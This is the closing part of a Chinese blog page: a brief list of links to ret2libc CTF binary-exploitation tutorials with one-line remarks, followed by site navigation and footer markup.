<p><a href="https://blog.csdn.net/m0_64180167/article/details/130263518?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-130263518-blog-122848031.235%5Ev38%5Epc_relevant_anti_vip_base&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-130263518-blog-122848031.235%5Ev38%5Epc_relevant_anti_vip_base&amp;utm_relevant_index=3"># CTFWIKI-PWN-ret2libc</a> 讲的非常详细<br> <a href="https://www.jianshu.com/p/5525dde00053" rel="nofollow"># pwn学习之ret2libc3——偏移计算初体验</a> 学习了部分技能<br> <a href="https://blog.csdn.net/DSR446/article/details/99698035"># 2019.7.25 ret2libc3 填充从112遍为104</a> 学到了可以用setvbuf进行泄露</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/313548351eb99b02fbdac9c68ec162a9/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">运行x509的库做TSL加密的时候报错“调用 SSPI 失败，请参见内部异常”。</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/cc153c6890b597a9bf5ff72a143ec04b/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">js 数组去重的几种方法</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程鬼谷子的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>